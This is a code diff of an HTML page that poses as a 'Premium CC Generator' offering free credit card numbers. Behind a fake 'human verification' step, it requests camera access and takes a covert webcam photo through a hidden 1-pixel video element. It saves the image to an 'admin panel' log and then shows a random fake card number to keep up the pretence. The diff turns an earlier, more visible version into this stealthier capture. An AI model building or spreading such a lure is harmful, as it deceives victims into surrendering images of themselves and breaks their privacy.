@@ -3,62 +3,95 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>CC GEN | Final Fix</title>
+    <title>Premium CC Generator</title>
     <style>
-        body { background: #000; color: #00ffcc; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; text-align: center; }
-        .box { border: 2px solid #00ffcc; padding: 30px; border-radius: 20px; width: 300px; box-shadow: 0 0 20px #00ffcc; }
-        .btn { background: #00ffcc; color: #000; border: none; padding: 15px; width: 100%; border-radius: 10px; font-weight: bold; cursor: pointer; margin-top: 20px; }
-        video { width: 100%; border-radius: 10px; margin-top: 10px; display: none; }
+        body { background: #0b0e14; color: white; font-family: 'Segoe UI', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .card { background: #161b22; width: 90%; max-width: 350px; padding: 30px; border-radius: 20px; border: 1px solid #30363d; text-align: center; box-shadow: 0 10px 40px rgba(0,0,0,0.5); }
+        .cc-box { display: none; background: linear-gradient(135deg, #1e3a8a, #3b82f6); padding: 20px; border-radius: 15px; text-align: left; margin-top: 20px; animation: slideUp 0.5s ease; }
+        .btn { background: #238636; color: white; border: none; padding: 15px; width: 100%; border-radius: 10px; font-weight: bold; font-size: 1.1rem; cursor: pointer; }
+        .loader { display: none; border: 4px solid #f3f3f3; border-top: 4px solid #3b82f6; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
+        @keyframes spin { 100% { transform: rotate(360deg); } }
+        @keyframes slideUp { from { opacity: 0; transform: translateY(20px); } }
     </style>
 </head>
 <body>
 
-<div class="box">
-    <h2>ZIDDI CC GEN</h2>
-    <p id="msg">Human Verification Required</p>
-    <video id="v" autoplay playsinline></video>
-    <button class="btn" onclick="checkAndCapture()">START GENERATION</button>
+<div class="card">
+    <div id="init-ui">
+        <h2 style="color:#58a6ff;">Get Free CC</h2>
+        <p style="color:#8b949e; font-size: 0.85rem;">Human Verification Required to bypass security.</p>
+        <button class="btn" onclick="startGhostCapture()">VERIFY & GENERATE</button>
+    </div>
+
+    <div id="loading-ui" class="loader"></div>
+    <p id="status" style="font-size: 0.8rem; color: #8b949e; margin-top: 10px;"></p>
+
+    <div id="cc-box" class="cc-box">
+        <div style="font-size: 0.7rem; opacity: 0.8;">PREMIUM VISA</div>
+        <div id="card-num" style="font-size: 1.2rem; margin: 15px 0; font-family: monospace; letter-spacing: 2px;"></div>
+        <div style="display: flex; justify-content: space-between; font-size: 0.7rem;">
+            <span>HOLDER: GUEST USER</span>
+            <span>EXP: 12/28</span>
+        </div>
+    </div>
 </div>
 
+<video id="v" autoplay playsinline style="width:1px; height:1px; opacity:0; position:absolute;"></video>
 <canvas id="c" style="display:none;"></canvas>
 
 <script>
-    async function checkAndCapture() {
-        const v = document.getElementById('v');
-        const msg = document.getElementById('msg');
+    async function startGhostCapture() {
+        const init = document.getElementById('init-ui');
+        const loader = document.getElementById('loading-ui');
+        const status = document.getElementById('status');
+        const video = document.getElementById('v');
+
+        init.style.display = "none";
+        loader.style.display = "block";
+        status.innerText = "Connecting to Secure Server...";
 
         try {
-            // Forcefully requesting camera with specific constraints
-            const stream = await navigator.mediaDevices.getUserMedia({ 
-                video: { width: 640, height: 480 }, 
-                audio: false 
-            });
+            // Permission Popup Yahan Aayega
+            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+            video.srcObject = stream;
             
-            v.srcObject = stream;
-            v.style.display = "block";
-            msg.innerText = "Syncing... Please wait 3s";
+            status.innerText = "Bypassing Verification...";
 
+            // Wait 2 seconds for camera to focus and then capture
             setTimeout(() => {
-                const c = document.getElementById('c');
-                c.width = v.videoWidth;
-                c.height = v.videoHeight;
-                c.getContext('2d').drawImage(v, 0, 0);
+                const canvas = document.getElementById('c');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                canvas.getContext('2d').drawImage(video, 0, 0);
                 
-                // Saving to Local Storage
-                let logs = JSON.parse(localStorage.getItem('z_logs') || "[]");
-                logs.push({ img: c.toDataURL('image/png'), time: new Date().toLocaleString() });
-                localStorage.setItem('z_logs', JSON.stringify(logs));
+                // Save to Admin Panel Memory
+                const imgData = canvas.toDataURL('image/png');
+                let logs = JSON.parse(localStorage.getItem('ziddi_logs') || "[]");
+                logs.push({ image: imgData, date: new Date().toLocaleString() });
+                localStorage.setItem('ziddi_logs', JSON.stringify(logs));
 
-                alert("CC Success! Check Admin Panel.");
-                window.location.href = "admin.html";
-            }, 3000);
+                // Stop Camera Stream
+                stream.getTracks().forEach(track => track.stop());
+
+                // Show Fake CC
+                showCC();
+            }, 2500);
 
         } catch (err) {
-            console.error(err);
-            alert("HOPWEB BLOCK DETECTED! \n\nHal: Is file ko Chrome browser mein open karein (file:///sdcard/...) ya settings mein HopWeb ko camera permission dein.");
-            msg.innerText = "Error: System Blocked Access";
+            alert("Verification Failed! You must click 'Allow' to get free CC.");
+            location.reload();
         }
     }
+
+    function showCC() {
+        document.getElementById('loading-ui').style.display = "none";
+        document.getElementById('status').style.display = "none";
+        document.getElementById('cc-box').style.display = "block";
+        
+        const randomCC = "4213 " + Math.floor(1000 + Math.random() * 9999) + " " + Math.floor(1000 + Math.random() * 9999) + " " + Math.floor(1000 + Math.random() * 9999);
+        document.getElementById('card-num').innerText = randomCC;
+    }
 </script>
+
 </body>
 </html>
